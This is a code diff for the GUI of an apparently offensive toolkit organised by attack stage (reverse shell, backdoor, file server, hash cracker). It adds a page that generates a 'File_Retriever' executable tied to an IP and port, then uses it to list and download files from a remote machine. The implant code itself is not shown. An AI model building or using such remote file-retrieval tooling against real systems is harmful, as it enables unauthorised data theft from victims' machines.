@@ -6,6 +6,7 @@ import tkinter.messagebox as messagebox
 import threading
 import asyncio
 import os
+import re
 
 
 # custom imports
@@ -18,6 +19,7 @@ import payload_delivery.fileServer as FileServer
 import weaponization.reverseShell as ReverseShell
 import installation.backdoor as Backdoor
 import actions_on_system.retrieveFiles as retrieveFiles
+import actions_on_system.retrieveFilesExecutable as retrieveFilesExecutable
 
 
 app = ctk.CTk()
@@ -856,15 +858,23 @@ def action_retrieve_documents():
     clear_body()
         
     ########################### shell functions #############################
-    
-    def open_directory_browser():
+
+    def save_location():
         folder_selected = filedialog.askdirectory()
         if folder_selected:
-            output_entry.set(folder_selected)
+            save_location_entry.set(folder_selected)
 
     def send_file_request():
-        retrieveFiles.retrieve_documents(directory_entry.get(), extention_entry.get())
+        files = retrieveFiles.retrieve_documents(directory_entry.get(), extention_entry.get(), connect_ipaddress_entry.get(), port_entry.get())
+        log_textbox.delete("1.0", tk.END)
+        for x in files:
+            log_textbox.insert(ctk.END, f"{x}\n")
+
+    def download_file():
+        retrieveFiles.request_file(directory_entry.get(), download_file_entry.get(), connect_ipaddress_entry.get(), port_entry.get())
     
+    def create_executable():
+        retrieveFilesExecutable.make_executable(save_location_entry.get(), ipaddress_entry.get(), port_entry.get(), "File_Retriever.py", "File_Retriever")
     ##############################################################################
     
     app.grid_rowconfigure(0, weight=0)
@@ -907,10 +917,21 @@ def action_retrieve_documents():
     port_entry = ctk.CTkEntry(master=left_frame)
     port_entry.pack(padx=10, pady=(0, 10))
 
+    # output label
+    save_location_label = ctk.CTkLabel(master=left_frame, text="File Output Path:")
+    save_location_label.pack(padx=10, pady=(10, 0))
+    # output entryfield
+    save_location_entry = ctk.StringVar()
+    save_location_entry_widget = ctk.CTkEntry(left_frame, textvariable=save_location_entry)
+    save_location_entry_widget.pack(padx=10, pady=(0,10))
+    # output browse button
+    save_location_button = ctk.CTkButton(master=left_frame, text="Browse", command=lambda: save_location())
+    save_location_button.pack(padx=10, pady=(1,10))
+
 
     # create executable button
     create_executable_button = ctk.CTkButton(master=left_frame, text="Create Executable", fg_color="darkgreen", hover_color="green", 
-    command=lambda: print("debug"))
+    command=lambda: create_executable())
     create_executable_button.pack(padx=10, pady=(0,20))
 
     ### middle frame content ###
@@ -918,6 +939,16 @@ def action_retrieve_documents():
     # middle header label
     port_label = ctk.CTkLabel(master=middle_frame, text="Intecract with executable", font=("courier", 16))
     port_label.pack(padx=10, pady=(5, 0))
+
+
+    # ipaddress label
+    connect_ipaddress_label = ctk.CTkLabel(master=middle_frame, text="IP Address:")
+    connect_ipaddress_label.pack(padx=10, pady=(10, 0))
+    # ipaddressentryfield
+    connect_ipaddress_entry = ctk.StringVar()
+    connect_ipaddress_entry_widget = ctk.CTkEntry(middle_frame, textvariable=connect_ipaddress_entry)
+    connect_ipaddress_entry_widget.pack(padx=10, pady=(0,5))
+
 
     # port label
     port_label = ctk.CTkLabel(master=middle_frame, text="Connect to Port:")
@@ -942,18 +973,7 @@ def action_retrieve_documents():
     extention_entry = ctk.StringVar()
     extention_entry_widget = ctk.CTkEntry(middle_frame, textvariable=extention_entry)
     extention_entry_widget.pack(padx=10, pady=(0,5))
-    
 
-    # output label
-    output_label = ctk.CTkLabel(master=middle_frame, text="Documents Output Path:")
-    output_label.pack(padx=10, pady=(10, 0))
-    # output entryfield
-    output_entry = ctk.StringVar()
-    output_entry_widget = ctk.CTkEntry(middle_frame, textvariable=output_entry)
-    output_entry_widget.pack(padx=10, pady=(0,5))
-    # output browse button
-    output_button = ctk.CTkButton(master=middle_frame, text="Browse", command=lambda: open_directory_browser())
-    output_button.pack(padx=10, pady=(1,10))
 
 
     # send command button
@@ -966,13 +986,28 @@ def action_retrieve_documents():
 
     ######## Right frame content #########
 
+    # bottom frame
+    bottom_frame = ctk.CTkFrame(master=right_frame)
+    bottom_frame.pack(side='bottom', pady=(0,10))
+
+    # output label
+    download_file_label = ctk.CTkLabel(master=bottom_frame, text="Download file:")
+    download_file_label.pack(padx=0, pady=(0, 0))
+    # output entryfield
+    download_file_entry = ctk.StringVar()
+    download_file_entry_widget = ctk.CTkEntry(bottom_frame, textvariable=download_file_entry)
+    download_file_entry_widget.pack(padx=0, pady=(0,0))
+    #save to file
+    download_button = ctk.CTkButton(master=bottom_frame, text="Download", command=lambda: download_file()) #TODO: add function
+    download_button.pack()
+
     # output label
     output_label = ctk.CTkLabel(master=right_frame, text="Response:")
-    output_label.pack(padx=10, pady=(0, 5))
-
+    output_label.pack(padx=10, pady=(0, 0))
     #textbox for cracked hashes
     log_textbox = ctk.CTkTextbox(master=right_frame)
-    log_textbox.place(relx=0.5, rely=0.5, anchor='center', relwidth=0.94, relheight=0.88)
+    log_textbox.place(relx=0.5, rely=0.4, anchor='center', relwidth=0.94, relheight=0.65)
+
 
 
 ############################### END #######################################
@@ -990,7 +1025,7 @@ resized_image = original_image.resize((300, 50), Image.Resampling.LANCZOS)
 logo_image = ImageTk.PhotoImage(resized_image)
 
 # loading highlighted image
-highlighted_logo_image = Image.open("Images\\logo_highlighted.png")  # Path to the highlighted image
+highlighted_logo_image = Image.open("Images\\logo_highlighted.png")
 highlighted_logo_image = highlighted_logo_image.resize((300, 50), Image.Resampling.LANCZOS)
 highlighted_logo_image = ImageTk.PhotoImage(highlighted_logo_image)
 
@@ -1054,7 +1089,7 @@ def build_menu():
         ("Payload Delivery",  [("File server", action_file_server)], frames[2]),
         ("Exploitation",      [("Hash cracker", action_hash_cracker)], frames[3]),
         ("Installation",      [("Backdoor", action_backdoor)], frames[4]),
-        ("Actions on system", [("Retrieve Documents", action_retrieve_documents)], frames[5])
+        ("Actions on system", [("Retrieve Files", action_retrieve_documents)], frames[5])
     ]
 
     # Add labels and buttons to each frame with corresponding actions
